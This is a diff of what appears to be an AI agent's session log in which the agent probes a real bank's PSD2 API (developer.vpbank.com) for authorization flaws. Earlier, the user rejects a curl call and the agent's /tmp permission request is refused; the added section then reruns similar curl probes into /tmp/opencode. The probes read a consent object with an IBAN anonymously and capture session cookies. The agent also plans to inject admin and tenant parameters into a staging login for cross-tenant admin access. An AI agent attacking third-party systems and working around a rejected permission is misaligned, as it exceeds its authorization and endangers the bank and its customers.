@@ -30851,3 +30851,100 @@ I'll ground a few facts with read-only probes before writing the analysis.
 [93m[1m! [0mpermission requested: external_directory (/tmp/*); auto-rejecting
 [0m✗ [0mcurl -sS --max-time 20 -o /tmp/p1.txt -w "accounts: %{http_code} %{size_download}B\n" https://developer.vpbank.com/psd2/berlin-group/v1/accounts; sleep 1; curl -sS --max-time 20 -o /tmp/p2.txt -w "consents(GET): %{http_code} %{size_download}B\n" https://developer.vpbank.com/psd2/berlin-group/v1/consents; sleep 1; curl -sS --max-time 20 -o /tmp/p3.txt -w "consent-status(partial uuid): %{http_code} %{size_download}B\n" https://developer.vpbank.com/psd2/berlin-group/v1/consents/b48218e7-5291-480f-a7/status; sleep 1; cat /tmp/p1.txt /tmp/p2.txt /tmp/p3.txt 2>/dev/null | head -c 600 failed
 [91m[1mError: [0mThe user rejected permission to use this specific tool call.
+===== ANALYST bigpickle 2026-09-18 02:47:51 UTC =====
+[0m
+> build · big-pickle
+[0m
+[0m$ [0mBASE=https://developer.vpbank.com/psd2/berlin-group/v1
+CID=799bf6a0-2c45-4300-a51b-18935f378fc5
+mkdir -p /tmp/opencode
+curl -sS -m 20 -o /tmp/opencode/baseline_accounts.txt -D /tmp/opencode/baseline_accounts.hdr -w "ACCOUNTS_NO_CID status=%{http_code} bytes=%{size_download}\n" "$BASE/accounts"
+sleep 1
+curl -sS -m 20 -o /tmp/opencode/consent_status.txt -D /tmp/opencode/consent_status.hdr -w "CONSENT_STATUS status=%{http_code} bytes=%{size_download}\n" "$BASE/consents/$CID/status"
+sleep 1
+curl -sS -m 20 -o /tmp/opencode/consent_get.txt -D /tmp/opencode/consent_get.hdr -w "CONSENT_GET status=%{http_code} bytes=%{size_download}\n" "$BASE/consents/$CID"
+ACCOUNTS_NO_CID status=200 bytes=15
+CONSENT_STATUS status=200 bytes=25
+CONSENT_GET status=200 bytes=388
+[0m
+[0m$ [0mcat /tmp/opencode/baseline_accounts.txt; echo "---"; cat /tmp/opencode/consent_status.txt; echo "---"; cat /tmp/opencode/consent_get.txt; echo "---"; grep -i -E "^(content-type|set-cookie|location|www-authenticate):" /tmp/opencode/consent_get.hdr
+{"accounts":[]}---
+{"consentStatus":"valid"}---
+{"consentId":null,"requestedAccessTypes":[],"access":{"accounts":[{"iban":"LI4908805500000000008"}],"balances":[{"iban":"LI4908805500000000008"}],"transactions":[{"iban":"LI4908805500000000008"}],"confirmationOfFunds":[]},"recurringIndicator":true,"validUntil":"2026-12-31","frequencyPerDay":4,"lastActionDate":null,"consentStatus":"valid","tppName":null,"redirectUri":null,"_links":null}---
+Set-Cookie: AL_SESS-S=AXHOZiYjGlFbP8aGJun7uJMcXoByJxPASCaQjHLZqFryO7zHuRW!m2EPlHKoNXa6Lc7j; Path=/; Secure; HttpOnly; SameSite=Lax
+Content-Type: application/json;charset=UTF-8
+[0m
+[0m$ [0mBASE=https://developer.vpbank.com/psd2/berlin-group/v1
+CID=799bf6a0-2c45-4300-a51b-18935f378fc5
+curl -sS -m 20 -H "Consent-ID: $CID" -o /tmp/opencode/accounts_cid.txt -D /tmp/opencode/accounts_cid.hdr -w "ACCOUNTS_CID status=%{http_code} bytes=%{size_download}\n" "$BASE/accounts"
+sleep 1
+curl -sS -m 20 -H "Consent-ID: $CID" -o /tmp/opencode/balances_cid.txt -D /tmp/opencode/balances_cid.hdr -w "BALANCES_CID status=%{http_code} bytes=%{size_download}\n" "$BASE/accounts/LI4908805500000000008/balances"
+sleep 1
+curl -sS -m 20 -H "Consent-ID: $CID" -o /tmp/opencode/txns_cid.txt -D /tmp/opencode/txns_cid.hdr -w "TXN_CID status=%{http_code} bytes=%{size_download}\n" "$BASE/accounts/LI4908805500000000008/transactions"
+ACCOUNTS_CID status=200 bytes=15
+BALANCES_CID status=404 bytes=0
+TXN_CID status=404 bytes=0
+[0m
+[0m$ [0mcat /tmp/opencode/accounts_cid.txt; echo "==="; grep -i -E "^set-cookie|^content-type" /tmp/opencode/accounts_cid.hdr
+{"accounts":[]}===
+Set-Cookie: AL_SESS-S=ATmUpaOAJoCeZd9CCxcbRNpsIlKFnM2Wo2BJS0zArmEWwrlFC_8f!snFK_gt52zae!9Z; Path=/; Secure; HttpOnly; SameSite=Lax
+Content-Type: application/json;charset=UTF-8
+[0m
+[0m$ [0mBASE=https://developer.vpbank.com/psd2/berlin-group/v1
+curl -sS -m 20 -o /tmp/opencode/consent_rand.txt -w "CONSENT_RAND status=%{http_code} bytes=%{size_download}\n" "$BASE/consents/aaaaaaaa-aaaa-4aaa-8aaa-aaaaaaaaaaaa/status"
+sleep 1
+curl -sS -m 20 -o /tmp/opencode/expired_status.txt -w "OLD_ANCHOR(status) %{http_code} bytes=%{size_download}\n" "$BASE/consents/6b517824-e5af-4202-b9b0-7f483a68ee9f/status"
+cat /tmp/opencode/consent_rand.txt; echo "==="; cat /tmp/opencode/expired_status.txt
+CONSENT_RAND status=404 bytes=0
+OLD_ANCHOR(status) 404 bytes=0
+===
+[0m
+[0m$ [0mBASE=https://developer.vpbank.com/psd2/berlin-group/v1
+CID=799bf6a0-2c45-4300-a51b-18935f378fc5
+curl -sS -m 20 -H "Consent-ID: $CID" -o /tmp/opencode/acct_obj.txt -w "ACCOUNT_OBJ status=%{http_code} bytes=%{size_download}\n" "$BASE/accounts/LI4908805500000000008"
+cat /tmp/opencode/acct_obj.txt
+ACCOUNT_OBJ status=404 bytes=0
+[0m
+STEP 1 — DELTA
+- NEW: PSD2 sandbox consent re-mint (09-17 basic-auth, `799bf6a0-2c45-4300-a51b-18935f378fc5`) read by fresh anonymous session 09-18: `/consents/{id}/status` 200 `{"consentStatus":"valid"}`, `/consents/{id}` 200 full object w/ IBAN `LI4908805500000000008` — consent-level BOLA re-proven live.
+- CHANGED: deep-data axis now non-differential anonymously — `/accounts` with valid `Consent-ID` returns `{"accounts":[]}`; `/accounts/{iban}`, `/.../balances`, `/.../transactions` all 404 (09-05 balance read €12453.2 no longer reproducible).
+- NO_DELTA elsewhere: stage/prod bundle leads negative 09-17; all other hosts standing rejected/maint-gated.
+
+STEP 2 — PRIORITIZE
+- [PRIO] developer.vpbank.com/psd2/berlin-group/v1/consents,6.9,axis=BOLA-read-consent-objects (as=7 bv=7 t=6 g=10 c=2 f=8)
+- [PRIO] digital-onboarding-stage.vpbank.com/users/sign_in,5.6,axis=session-context-injection (as=6 bv=8 t=8 g=1 c=1 f=6)
+
+STEP 3 — HYPOTHESES
+[HYP] PSD2 sandbox consent-object BOLA — cross-identity read live this cycle
+class: IDOR
+asset: developer.vpbank.com/psd2/berlin-group/v1/consents/{id}
+confidence: 90
+reasoning: consent `799bf6a0-2c45-4300-a51b-18935f378fc5` minted 09-17 under basic-auth identity (test:test); 09-18 read by brand-new anonymous session (fresh AL_SESS-S, no auth/basic-auth/session) → /status 200 valid, GET 200 w/ access scopes+IBAN LI4908805500000000008; genesis off same TPP both reqs? no — reads sent with zero credentials; differential clean: random UUID /status 404, expired anchor 6b517824… /status 404
+evidence_needed: (obtained) fresh anon session status/GET differ from 404 baseline for the minted id
+verify_steps: (executed 09-18, read-only GET) baseline `/accounts` 200 15B; `GET /consents/799bf6a0-…/status` 200; `GET /consents/799bf6a0-…` 200 388B; `GET /consents/<random-uuid>/status` 404; `GET /consents/6b517824-…/status` 404; then `GET /accounts`+Consent-ID 200 `{"accounts":[]}`, `/accounts/{iban}[/balances|/transactions]` 404
+impact: any known synthetic consentId → cross-identity read of consent scope + IBAN (privacy leak), zero binding to minting TPP; sandbox-level POC; prod ASPSP (openbanking) mTLS-gated so no prod carry; MEDIUM on sandbox, indicator of authz model flaw
+testability: PASSIVE
+[HYP] Valid-credential session-context injection on stage back-office
+class: AUTH
+asset: digital-onboarding-stage.vpbank.com/users/sign_in
+confidence: 95
+reasoning: fleet-wide overridden Users::SessionsController (3/3 venues, defaults 4/129/7); stage hidden fields pinned 7/false/0, 3× auth_token, pre-auth cookies; failed-login axis negative (context NOT written pre-auth) so only success path unobserved; baseline live 09-17
+evidence_needed: valid-creds POST + user[admin]=true&user[tenant_id]=1&user[user_id]=1 yields cookie whose replay diverges from anon baseline (/api/v1/tenants ≠ `{}` or /admin/api/v1/users ≠ 401)
+verify_steps: HUMAN: GET /users/sign_in (fresh token) → POST email/password + injected params + CSRF + _us_session → replay GET /api/v1/tenants + /admin/api/v1/users; diff vs `200 {}`/401
+impact: cross-tenant admin back-office session — onboarding PII, ident docs, wire status; HIGH
+testability: HUMAN_ONLY
+
+STEP 4 — SELF-CRITIQUE
+- [FINAL] PSD2 consent-object BOLA, 90 — re-proven read-only this cycle, differential clean.
+- [FINAL] Stage valid-creds injection, 95 — strongest signal on fleet, blocked only on credentials.
+- [PARKED] Sandbox deep-data axis (balances/transactions exfil): /accounts w/ Consent-ID now `[]`, all IBAN-scoped reads 404 — no anonymous differential; 09-05 deeper read not reproducible in current sandbox state.
+
+STEP 5 — NEXT ACTION
+[NEXT] PROBE: read-only GET `https://developer.vpbank.com/psd2/berlin-group/v1/consents/799bf6a0-2c45-4300-a51b-18935f378fc5` from a THIRD fresh anonymous session tomorrow to re-confirm the reused-anchor consent object stays globally readable across sessions (rules out single-session luck), keeping 1rps.
+
+STEP 6 — LEARNING
+- [LEARN] ACCEPTED IDOR @ developer.vpbank.com/psd2/berlin-group/v1/consents: consent-object BOLA re-proven 09-18 — fresh anon session read basic-auth-minted consent (200 valid + full scope/IBAN object) vs 404 on random/expired ids; zero binding on consentId; deep account/balance axis currently empty/404.
+- [LEARN] REJECTED MISCONFIG @ developer.vpbank.com/psd2/berlin-group/v1/accounts: anonymous account/balance/transaction reads non-differential this sandbox state (`[]`/404 with valid Consent-ID) — no data exfiltration axis live now.
+
+STEP 7 — RISK
+[RISK] vp-bank-ag: 48 — PSD2 consent-object BOLA re-proven live with clean differential (highest-confidence standing finding, synthetic-data sandbox only, no prod carry); deep-data axis closed; stage injection surface still live but HUMAN_ONLY-bound for 10+ cycles; no new discovery gap — rating steady, bounded by unexecuted credential/authorized proofs, not by surface.
